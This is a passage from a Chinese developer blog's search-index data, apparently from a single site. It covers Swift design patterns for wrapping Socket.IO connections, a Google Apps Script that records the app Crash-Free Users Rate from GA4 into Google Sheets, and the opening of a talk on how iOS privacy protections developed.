SIOConnectionStateMachineError(\"ReleasedState can't request!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't receiveOn!\") } func send(socketManager: SIOManagerSpec, event: String) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't send!\") } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't disconnect!\") }}do { let stateMachine = SIOConnectionStateMachine() // mock on socket.io connect: // socketIO.on(connect){ try stateMachine.currentSIOConnectionState.onConnected() try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") try stateMachine.currentSIOConnectionState.release(socketManager: manager) try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") // }} catch { print(\"error: \\(error)\")}// output:// error: SIOConnectionStateMachineError(message: \"ConnectedState can\\'t release!\")需求場景 3.What?結合場景 1. 2.，有了 ConnectionPool 享元池子加上 State Pattern 狀態管理後；我們繼續往下延伸，如背景目標所述，Feature 端不需去管背後 Connection 的連線機制；因此我們建立了一個輪詢器 (命名為 ConnectionKeeper ) 會定時掃描 ConnectionPool 中強持有的 Connection ，並在發生以下狀況時做操作： Connection 有人在使用且狀態非 Connected ：將狀態改為 Reconnecting 並嘗試重新連線 Connection 已無人使用且狀態為 Connected ：將狀態改為 Disconnected Connection 已無人使用且狀態為 Disconnected ：將狀態改為 Released 並從 ConnectionPool 中移除Why? 三個操作有上下關係且互斥 (disconnected -&gt; released or reconnecting) 可彈性抽換、增加狀況操作 未封裝的話只能將三個判斷及操作直接寫在方法中 (難以測試其中邏輯) e.g:if !connection.isOccupie() &amp;&amp; connection.state == .connected then... connection.disconnected()else if !connection.isOccupie() &amp;&amp; state == .released then... connection.release()else if connection.isOccupie() &amp;&amp; state == .disconnected then... connection.reconnecting()endHow? Chain Of Resposibility ：行為型 Pattern，顧名思義是一條鏈，每個節點都有相應的操作，輸入資料後節點可決定是否要操作還是丟給下一個節點處理，另一個現實應用是 iOS Responder Chain 。 照定義 Chain of responsibility Pattern 是不允許某個節點已經接下處理資料，但處理完又丟給下一個節點繼續處理， 要做就做完，不然不要做 。 如果是上述場景比較適合的應該是 Interceptor Pattern 。 Chain of responsibility： ConnectionKeeperHandler 為鍊的節點抽象，特別抽出 canExcute 方法避免發生上述 這個節點接下來處理了，但做完又想呼叫後面的節點繼續執行的狀況、 handle 為鍊的節點串連、 excute 為要處理的話會怎麼處理的邏輯。ConnectionKeeperHandlerContext 用來存放會用到的資料， isOccupie 代表 Connection 有無人在使用。enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState {get} var url: URL {get} var id: UUID {get} init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//struct ConnectionKeeperHandlerContext { let connection: Connection let isOccupie: Bool}protocol ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? { get set } func handle(context: ConnectionKeeperHandlerContext) func execute(context: ConnectionKeeperHandlerContext) func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool}extension ConnectionKeeperHandler { func handle(context: ConnectionKeeperHandlerContext) { if canExcute(context: context) { execute(context: context) } else { nextHandler?.handle(context: context) } }}class DisconnectedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .connected &amp;&amp; !context.isOccupie { return true } return false }}class ReconnectConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.reconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; context.isOccupie { return true } return false }}class ReleasedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; !context.isOccupie { return true } return false }}let connection = SIOConnection(url: URL(string: \"wss://pinkoi.com\")!)let disconnectedHandler = DisconnectedConnectionKeeperHandler()let reconnectHandler = ReconnectConnectionKeeperHandler()let releasedHandler = ReleasedConnectionKeeperHandler()disconnectedHandler.nextHandler = reconnectHandlerreconnectHandler.nextHandler = releasedHandlerdisconnectedHandler.handle(context: ConnectionKeeperHandlerContext(connection: connection, isOccupie: false))需求場景 4.What?我們封裝出的 Connection 需要經過 setup 後才能使用，例如給予 URL Path、設定 Config…等等Why? 可以彈性的增減構建開口 可複用構建邏輯 未封裝的話，外部可以不照預期操作類別 e.g.:❌let connection = Connection()connection.send(event) // unexpected method call, should call .connect() first✅let connection = Connection()connection.connect()connection.send(event)// but...who knows???How? Builder Pattern ：創建型 Pattern，能夠分步驟構建對象及複用構建方法。 Builder Pattern： SIOConnectionBuilder 為 Connection 的構建器，負責設定、存放構建 Connection 時會用到的資料； ConnectionConfiguration 抽象介面用來保證要使用 Connection 前必須呼叫 .connect() 才能拿到 Connection 實體。enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState {get} var url: URL {get} var id: UUID {get} init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//class SIOConnectionClient: ConnectionConfiguration { private let url: URL private let config: [String: Any] init(url: URL, config: [String: Any]) { self.url = url self.config = config } func connect() -&gt; Connection { // set config return SIOConnection(url: url) }}protocol ConnectionConfiguration { func connect() -&gt; Connection}class SIOConnectionBuilder { private(set) var config: [String: Any] = [:] func setConfig(_ config: [String: Any]) -&gt; SIOConnectionBuilder { self.config = config return self } // url is required parameter func build(url: URL) -&gt; ConnectionConfiguration { return SIOConnectionClient(url: url, config: self.config) }}let builder = SIOConnectionBuilder().setConfig([\"test\":123])let connection1 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()let connection2 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()延伸：這裏也可以再套用 Factory Pattern ，將用工廠產出 SIOConnection 。完結!以上就是本次封裝 Socket.IO 中遇到的四個場景及七個使用到解決問題的 Design Patterns。最後附上此次封裝 Socket.IO 的完整設計藍圖與文中命名、示範略為不同，這張圖才是真實的設計架構；有機會再請原設計者分享設計理念及開源。Who?誰做了這些設計跟負責 Socket.IO 封裝專案呢？Sean Zheng , Android Engineer @ Pinkoi主要架構設計者、Design Pattern 評估套用、在 Android 端使用 Kotlin 實現設計。ZhgChgLi , Enginner Lead/iOS Enginner @ PinkoiPlatform Team 專案負責人、Pair programming、在 iOS 端使用 Swift 實現設計、討論並提出質疑(a.k.a. 出一張嘴)及最後撰寫本文與大家分享。延伸閱讀 Design Patterns 的實戰應用紀錄 — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableView有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 3,564 Total Views Last Statistics Date: 2025-01-19 | 3,309 Views on Medium. " }, { "title": "Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate", "url": "/posts/793cb8f89b72/", "categories": "ZRealm Dev.", "tags": "crashlytics, ios-app-development, google-analytics, google-apps-script, google-sheets", "date": "2021-11-21 22:47:10 +0800", "snippet": "Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate使用 Google Apps Script 透過 Google Analytics 查詢 Crashlytics 自動填入到 Google Sheet 上篇「 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 」我們將 Crashl...", "content": "Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate使用 Google Apps Script 透過 Google Analytics 查詢 Crashlytics 自動填入到 Google Sheet 上篇「 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 」我們將 Crashlytics 閃退紀錄 Export Raw Data 到 Big Query，並使用 Google Apps Script 自動排程查詢 Top 10 Crash &amp; 發布訊息到 Slack Channel。本篇接續自動化一個與 App 閃退相關的重要數據 — Crash-Free Users Rate 不受影響使用者的百分比 ，想必很多 App Team 都會持續追縱、紀錄此數據，以往都是傳統人工手動查詢，本篇目標是將此重複性工作自動化、也能避免人工查詢時可能貼錯數據的狀況；同之前所述，Firebase Crashlytics 沒有提供任何 API 供使用者查詢，所以我們同樣要借助將 Firebase 數據串接到其他 Google 服務，再透過該服務 API 查詢相關數據。一開始我以為這個數據同樣能從 Big Query 查詢出來；但其實這方向完全錯誤，因為 Big Query 是 Crash 的 Raw Data，不會有沒有閃退的人的數據，因此也算不出 Crash-Free Users Rate；關於這個需求在網路上的資料不多，查詢許久才找到有人提到 Google Analytics 這個關鍵字；我知道 Firebase 的 Analytics、Event 都能串到 GA 查詢使用，但沒想到 Crash-Free Users Rate 這個數據也包含在內，翻閱了 GA 的 API 後，Bingo！API Dimensions &amp; MetricsGoogle Analytics Data API (GA4) 提供兩個 Metrics： crashAffectedUsers ：受閃退影響的使用者數量 crashFreeUsersRate ：不受閃退影響的使用者百分比(小數表示)知道路通之後，就可以開始動手實作了！串接 Firebase -&gt; Google Analytics可參考 官方說明 步驟設定，本篇省略。GA4 Query Explorer Tool開始寫 Code 之前，我們可以先用官方提供的 Web GUI Tool 來快速建造查詢條件、取得查詢結果；實驗完結果是我們想要的之後，再開始寫 Code。前前往 &gt;&gt;&gt; GA4 Query Explorer 在左上方記得選到 GA4 右方登入完帳號後，選擇相應的 GA Account &amp; Property Start Date、EndDate：可直接輸入日期或用特殊變數表示日期 ( ysterday , today , 30daysAgo , 7daysAgo ) metrics：增加 crashFreeUsersRate dimensions：增加 platform (設備類型 iOS/Android/Desktop. . . ) dimension filter：增加 platform 、 string 、 exact 、 iOS or Android針對雙平台的 Crash Free Users Rate 分別查詢。拉到最下面點擊「Make Request」查看結果，我們就能得到指定日期範圍內的 Crash-Free Users Rate。 可以回頭打開 Firebase Crashlytics 比對同樣條件數據是否相同。 這邊有發現兩邊數字可能會有微微差距(我們有一項數字差了 0.0002)，原因不明，不過在可以接受的誤差範圍內；若統一都使用 GA Crash-Free Users Rate 那也不能算是誤差了。使用 Google Apps Script 自動填入數據到 Google Sheet再來就是自動化的部分，我們將使用 Google Apps Script 查詢 GA Crash-Free Users Rate 數據後自動填入到我們的 Google Sheet 表單；已達自動填寫、自動追蹤的目標。假設我們的 Google Sheet 如上圖。可以點擊 Google Sheet 上方的 Extensions -&gt; Apps Script 建立 Google Apps Script 或是 點此前網 Google Apps Script -&gt; 左上方 新增專案即可。進來後可以先點上方未命名專案名稱，給個專案名稱。在左方的「Services」點「+」加上「Google Analytics Data API」。回到剛剛的 GA4 Query Explorer 工具，在 Make Request 按鈕旁邊可以勾選「Show Request JSON」取得此條件的 Request JSON。將此 Request JSON 轉換成 Google Apps Script 後如下：// Remeber add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet 名稱const googleSheetName = \"App Crash-Free Users Rate\";function execute() { Logger.log(fetchCrashFreeUsersRate())}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;} GA Property ID：一樣也可以由剛剛的 GA4 Query Explorer 工具取得：在一開始的選擇 Property 選單中，選擇的 Property 下方的數字就是 propertyId 。 googleSheetID：可以由 Google Sheet 網址中取得 https://docs.google.com/spreadsheets/d/ googleSheetID /edit googleSheetName：Google Sheet 中閃退紀錄的 Sheet 名稱將以上程式碼貼到 Google Apps Script 右方程式碼區塊＆上方執行方法選擇「execute」function 後可以點擊 Debug 測試看看是否能正常取得資料：第一次執行會出現要求授權視窗：按照步驟完成帳號授權即可。執行成功會在下方 Log Print 出 Crash-Free Users Rate，代表查詢成功。再來我們只要再加上自動填入 Google Sheet 就大功告成了！完整 Code：// Remeber add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet 名稱const googleSheetName = \"\";function execute() { const today = new Date(); const daysAgo7 = new Date(new Date().setDate(today.getDate() - 6)); // 今天不算，所以是 -6 const spreadsheet = SpreadsheetApp.openById(googleSheetID); const sheet = spreadsheet.getSheetByName(googleSheetName); var rows = []; rows[0] = Utilities.formatDate(daysAgo7, \"GMT+8\", \"MM/dd\")+\"~\"+Utilities.formatDate(today, \"GMT+8\", \"MM/dd\"); rows[1] = fetchCrashFreeUsersRate(\"iOS\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); rows[2] = fetchCrashFreeUsersRate(\"android\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); sheet.appendRow(rows);}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;}再次點擊上方 Run or Debug 執行「execute」。回到 Google Sheet，數據新增成功！新增 Trigger 排程自動執行選擇左方時鐘按鈕 -&gt; 右下方「+ Add Trigger」。 第一個 function 選擇「execute」 time based trigger 可選擇 week timer 每週追蹤＆新增一次數據設定完點擊 Save 即可。完成現在開始，紀錄追蹤 App Crash-Free Users Rate 數據完全自動化；不需要人工手動查詢＆填入；全部交給機器自動處理！ 我們只需專注在解決 App Crash 問題！ p.s. 不同於上一篇使用 Big Query 需要花錢查詢資料，此篇查詢 Crash-Free Users Rate、Google Apps Script 都是完全免費，可以放心使用。如果想將結果同步發送到 Slack Channel 可參考 上一篇文章 ：延伸閱讀 Ultimate Beginner’s Guide to Google Analytics 4 (NEW 2023 Interface) (Thanks to Emma for providing the information ) Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 Slack 打造全自動 WFH 員工健康狀況回報系統 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,091 Total Views Last Statistics Date: 2025-01-19 | 977 Views on Medium. " }, { "title": "iOS 隱私與便利的前世今生", "url": "/posts/9a05f632eba0/", "categories": "ZRealm Dev.", "tags": "ios-app-development, privacy, private-relay, apple-privacy, mopcon", "date": "2021-10-24 09:15:55 +0800", "snippet": "iOS 隱私與便利的前世今生Apple 隱私原則及 iOS 歷年對隱私保護的功能調整Theme by slidego[2023–08–01] iOS 17 Update對於之前演講的最新 iOS 17 隱私相關調整補充。Link Tracking ProtectionSafari 會自動移除網址的 Tracking Parameter 參數 (e.g. fbclid 、 gclid …) ...", "content": "iOS 隱私與便利的前世今生Apple 隱私原則及 iOS 歷年對隱私保護的功能調整Theme by slidego[2023–08–01] iOS 17 Update對於之前演講的最新 iOS 17 隱私相關調整補充。Link Tracking ProtectionSafari 會自動移除網址的 Tracking Parameter 參數 (e.g. fbclid 、 gclid …) 舉例： https://zhgchg.li/post/1?gclid=124 點擊後會變 https://zhgchg.li/post/1 目前測試 iOS 17 Developer Beta 4， fbxxx 、 gcxxx . .等等會被移掉， utm_ 是有保留的；不確定正式版 iOS 17 或日後 iOS 18 會不會再加強。 如果想知道最嚴格情況下的效果可安裝 iOS DuckDuckGo 瀏覽器進行測試。 詳細測試細節請參考「 iOS17 Safari 的新功能會把網址裡的 fbclid 跟 gclid 砍掉 」大大的這篇文章。Privacy Manifest .xprivacy &amp; Report開發者需把使用到的 User Privacy 宣告在內， 並也需要要求有使用到的 SDK 提供該 SDK 的 Privacy Manifest。*另外也增加第三方 SDK SignatureXCode 15 能透過 Manifest 產生 Privacy Report 供開發者在 App Store 上做 App 隱私設定。Required reason API為避免部分有機會得出 fingerprinting 的 Foundation API 被濫用，蘋果開始針對部分 Foundation API 做管控； 需要在 Mainfest 中宣告為何要使用 。目前比較有影響的是 UserDefault 即屬於要宣告的 API。從 2023 年秋季開始，如果你上傳到 App Store Connect 的新 App 或 App 更新使用了需要聲明原因的 API (包括來自第三方 SDK 的內容)，而你沒有在 App 的隱私清單中提供批准的原因，那麼你會收到通知。從 2024 年春季開始，若要將新 App 或 App 更新上傳到 App Store Connect，你需要在 App 的隱私清單中註明批准的原因，以準確反映你的 App 如何使用相應 API。如果目前批准原因的涵蓋範圍內並未包含某個需要聲明原因的 API 的用例，且你確信這個用例可讓你的 App 用戶直接受益，請告訴我們。Tracking Domain發送 Tracking 資訊的 API Domain 需宣告在 privacy manifest .xprivacy 並在使用者同意追蹤後才能發起網路請求，否則此 Domain 的網路請求全部都會被系統攔截。可從 XCode Netowrk 工具中檢查 Tracking Domain 是否被攔截：目前實測 Facebook、Google 的 Tracking Domain 都會被偵測到，需要照規定列入 Tracking Domain 並詢問權限。 graph.facebook.com : Facebook 相關數據統計 app-measurement.com : Google 相關數據統計：GA/Firebase….因此請注意 FB/Google 數據統計在 iOS 17 後可能會大幅流失，因為未詢問權限、不允許追蹤，會完全收不到數據；根據以往實作詢問追蹤的成效，大約有 7 成的使用者都會按不允許。 開發者自己的打 API 送 Tracking 方式，蘋果也說需要同上列管 Tracking Domain 如果 Tracking Domain 跟 API Domain 相同則需分開一個獨立的 Tracking Domain (e.g. api.zhgchg.li -&gt; tracking.zhgchg.li) 目前暫時無法知道蘋果如何控管開發者自己的 Tracking，用 XCode 15 測試自家的沒有被發現。 不清楚官方是否會用工具檢測行為、或是審核人員人工查看 fingerprinting 依然禁止。前言這次很榮幸能參加 MOPCON 演講 ，但因疫情關係改成線上直播形式蠻遺憾的，無法認識更多新朋友；這次演講的主題是「iOS 隱私與便利的前世今生」主要想跟大家分享 Apple 關於隱私的原則及這些年來 iOS 基於這些隱私原則所做的功能調整。iOS 隱私與便利的前世今生 | Pinkoi, We Are Hiring!相信這幾年開發者或是 iPhone 用戶應該都對以下功能調整並不陌生： iOS ≥ 13： 所有支援第三方登入的 App 都需要多實作 Sign in with Apple，否則無法成功上架 App iOS ≥ 14： 剪貼簿存取警告 iOS ≥ 14.5： IDFA 必須允許後才能存取，幾乎等同封殺 IDFA iOS ≥ 15 ：Private Relay，使用 Proxy 隱藏使用者原始 IP 位址 iOS ≥ 16 ：剪貼簿存取需使用者授權 ….還有很多很多，會在文章後跟大家分享Why?如果不清楚 Apple 的隱私原則，甚至會覺得為何 Apple 這幾年不斷地在跟開發者、廣告商作對？很多大家用得很習慣的功能都被封鎖了。再追完「 WWDC 2021 — Apple’s privacy pillars in focus 」及「 Apple privacy white paper — A Day in the Life of Your Data 」兩份文件後如夢初醒，原來我們早已在不知不覺中洩漏許多個人隱私並且讓廣告商或社群媒體賺的盆滿缽滿，在我們的日常生活中已經達到無孔不入的境界。參考 Apple privacy white paper 改寫，以下以虛構人物哈里為例；為大家講述隱私是如何洩漏的及可能造成的危害。首先是哈里 iPhone 上的使用紀錄。左邊是網頁瀏覽紀錄： 可以看到分別造訪了跟車子、iPhone 13、精品有關的網站右邊是已安裝的 App： 有投資、旅遊、社交、購物、還有嬰兒攝影機…這些 App哈里的線下人生線下活動會留下記錄的地方例如：發票、信用卡刷卡紀錄、行車記錄器…等等組合你可能會想說，我瀏覽不同的網站、裝不同的 App (甚至根本沒登入)、再到線下活動怎麼可能有機會讓某個服務串起所有資料？答案是：就技術手段是有的，而且「可能」或是「已經」局部發生。如上圖所示： 未登入時網站與網站之間可以透過 Third-Party Cookie、IP Address + 裝置資訊算出的 Fingerprint 在不同網站中識別出同個瀏覽者。 登入時網站與網站之間可以透過註冊資料，如姓名、生日、電話、Email、身分證字號…串起你的資料 App 與 App 之間可以透過取得 Device UUID 在不同 App 中識別出同個使用者、URL Scheme 嗅探手機上其他已安裝的 App、Pasteboard 在 App 與 App 間傳遞資料；另外一樣也可在使用者登入後用註冊資料串起資料。 App 與網站之間同樣可以用 Third-Party Cookie、Fingerprint、Pasteboard 傳遞資料 線上與線下活動的串連可能發生在，銀行端蒐集信用卡消費記錄、記帳 App、發票蒐集 App、行車記錄器 App…等等，都有機會把線下活動與線上資料串接在一起 事實證明，技術上是可行的；那究竟躲在所有網站、App 之後的第三方是誰呢？諸如家大業大的 Facebook、Google 都靠個人廣告獲得不少收益；許多網站、App 也都會串接 Facebook、Google SDK…所以一切都很難說，這還是看得到，更多時候我們根本不知道網站、App 用了哪些第三方廣告、數據蒐集服務，在背後偷偷紀錄著我們的一舉一動。我們假設哈里所有的活動，背後都偷藏著同一個第三方在默默收集他的資料，那麼在它的眼裡，哈里可能的輪廓如下：左邊是個人資料，可能來自網站註冊資料、外送資料；右邊是依照哈里的活動紀錄打上的行為、興趣標籤。在它眼中的哈里，可能比哈里還更了解自己；這些資料用在社交媒體，可以讓使用者更加沈淪；用在廣告上，可以刺激哈里過度消費或是營造鳥籠效應(EX: 推薦你買新褲子，你買了褲子就會買合適的鞋子來穿搭，買了鞋子就會再買襪子…沒完沒了)。如果你覺得以上已經夠可怕了，還有更可怕的：有你的個人資料又知道你的經濟狀況…要做惡的話不敢想像，例如：綁架、竊盜…目前的隱私保護方式 法律規範 (EX: SGS-BS10012 個資驗證、CCPA、GDPR…) 隱私權協議、去識別化主要還是透過法規約束；很難確保服務 100% 隨時遵守、網路上惡意程式也很多也難保證服務不會被駭造成資料外洩；總之還是「 要做惡技術上都可行，單靠法規跟企業良心約束 」。除此之外更多時候，我們是「被迫」接受隱私權條款的，無法針對個別隱私授權，要馬整個服務都不用，要馬就是用但要接受全部隱私權條款；還有隱私條款不透明，不知道會怎麼被收集及應用，更不知道背後有沒有還躲著一個第三方在你根本不知道情況下蒐集你的資料。另外 Apple 還有提到關於未成年人的個人隱私，多半也都在監護人未同意的情況下被服務蒐集。Apple’s privacy principles知道個人隱私洩露帶來的危害之後，來看一下蘋果的隱私原則。節錄自 Apple Privacy White Paper 蘋果的理想不是完全封殺而是平衡，例如這幾年很多人都會直接裝 AD Block 完全阻斷廣告，這也不是蘋果想看到的；因為如果完全斷開就很難做出更好的服務。賈伯斯在 2010 年的 All Things Digital Conference 說過： 我相信人是聰明的，有些人會比其他人更想分享數據，每次都去問他們，讓他們煩到叫你不要再問他們了，讓他們精準的知道你要怎麼使用他們的資料。 — translate by Chun-Hsiu Liu 蘋果相信隱私是基本人權蘋果的四個隱私原則： Data Minimization：只取用你需要的資料 On-Device Processing：Apple 基於強大的處理器晶片，如非必要，個人隱私相關資料應在本地執行 User Transparency and Control：讓使用者了解哪些隱私資訊被蒐集？被用在哪？另外也要讓使用者能針對個別隱私資料分享開關控制 Security：確保資料儲存、傳遞的安全iOS 基於保護個人隱私的歷年功能調整了解到個人隱私洩露的危害及蘋果的隱私原則後，回到技術手段上；我們可以來看看 iOS 這些年來針對保護個人隱私的功能調整有哪些。網站與網站之間前面有提到第一種方法可以用 Third-Party Cookie 跨網站串起瀏覽者資料： 🈲，在 iOS &gt;= 11 後的 Safari 都實裝了 Intelligent Tracking Prevention ( WebKit )預設啟用，瀏覽器會主動辨識用於追蹤、廣告的第三方 Cookie 加以阻擋；並且在每年的 iOS 版本不斷地加強辨識程式防止遺漏。透過 Third-Party Cookie 跨網站追蹤使用者這條路，在 Safari 上基本上已經行不通了。第二種方法是用 IP Address + 裝置資訊算出的 Fingerprint 在不同網站中識別出同個瀏覽者： 🈲，iOS &gt;= 15 Private Relay尤其在 Third-Party Cookie 被禁之後，有越來越多服務採用這個方法，蘋果也知道…所幸在 iOS 15 連 IP 資訊都給你混淆了！Private Relay 服務會將使用者的原始請求先隨機送到蘋果的 Ingress Proxy，再由蘋果隨機分派到合作 CDN 的 Egress Proxy，再由 Egress Proxy 去請求目標網站。整個流程都經過加密只有自己 iPhone 的晶片解的開，也只有自己同時知道 IP 與請求的目標網站；蘋果的 Ingress Proxy 只知道你的 IP、CDN 的 Egress Proxy 只知道蘋果的 Ingress Proxy IP 跟請求的目標網站、網站只知道 CDN 的 Egress Proxy IP。從應用角度來看，同一個地區的所有裝置都會使用同個共享的 CDN 的 Egress Proxy IP 來請求目標網站；也因此網站端無法再用 IP 當成 Fingerprint 資訊。技術細節可參考「 WWDC 2021 — Get ready for iCloud Private Relay 」。補充 Private Relay： Apple/CDN Provider 都沒有完整 Log 可追朔：查了下這樣蘋果怎麼防止被用在惡意的地方，沒找到答案；可能就跟蘋果也不會幫 FBI 解鎖罪犯 iPhone 一樣意思吧；隱私是所有人的基本人權。 預設開啟，不需特別連接 不影響速度、效能 IP 會保證在同個國家和時區 （使用者可選模糊城市）、無法指定 IP 只對部分流量有效 iCloud+ 用戶：所有 Safari 上的流量 + App 中的 Insecure HTTP Request一般用戶：僅對 Safari 上網站安裝的第三方追蹤工具有效 官方有提供 CDN Egress IP List 供網站開發者辨認 (不要誤 Blocking Egress IP，會造成群體傷害) 網路管理者可 Ban 掉 DNS 對所有連接者停用 Private Relay iPhone 可針對特定網路連線停用 Private Relay 連接 VPN/ 掛 Proxy 時會停用 Private Relay 目前還在 Beta 版 (2021/10/24)，啟用後部分服務可能會連不上 (中國地區、中國版抖音)或是服務會頻繁被登出Private Relay 實測圖 圖一 未啟用：原始 IP 位址 圖二 啟用 Private Relay — 保持一般位置：IP變成 CDN IP 但依然在 Taipei 圖三 啟用 Private Relay — 使用國家和時區（擴大模糊）：IP變成 CDN IP &amp; 變在 Taichung，但依然還是同個時區和國家測試專案App 可以用 URLSessionTaskMetrics 分析 Private Relay 的連接紀錄。扯遠了，因此用 IP 位址得到 Fingerprint 去辨識使用者的方法，也無法再使用了。App 與 App 之間第一種方式是早期可以直接存取 Device UUID： 🈲，iOS &gt;= 7 禁止存取 Device UUID, 使用 IDentifierForAdvertisers/IDentifierForVendor 取代 IDFV： 同個開發者帳號下的所有 App 能拿到同一個 UUID； 搭配 KeyChain 也是目前使用者 UUID 的辨識方法 。 IDFA： 不同開發者、不同 App 之間能拿到相同的 UUID，但是 IDFA 使用者可以重設或禁用。 🈲，iOS &gt;= 14.5 IDentifierForAdvertisers 需詢問後才能使用iOS 14.5 後蘋果加強對 IDFA 的取用限制，App 需要先詢問使用者允不允許追蹤後才能取得 IDFA UUID；未詢問、未允許的情況下都拿不到值。市調公司初步調查數據大約有 7成的使用者(最新數據有人說 9 成)都不允許追蹤取用 IDFA，所以大家才會說 IDFA 已死！測試專案App 與 App 之間互通有無的第二種方法是 URL Scheme：iOS App 可以使用 canOpenURL 去探測使用者手機上有沒有裝某個 App。 🈲，iOS &gt;= 9 需先在 App 內設定才能使用；不能任意探測。 iOS ≥ 15 新增限制，最多只能設定 50 組其他 App 的 Scheme。 Apps linked on or after iOS 15 are limited to a maximum of 50 entries in the LSApplicationQueriesSchemes key.網站 與 App 之間同前文所述第一種方法也是透過 Cookie 來串接：早期 iOS Safari 的 Cookie 跟 App WebView 的 Cookie 是可以互通的，可以藉此串起 網站與 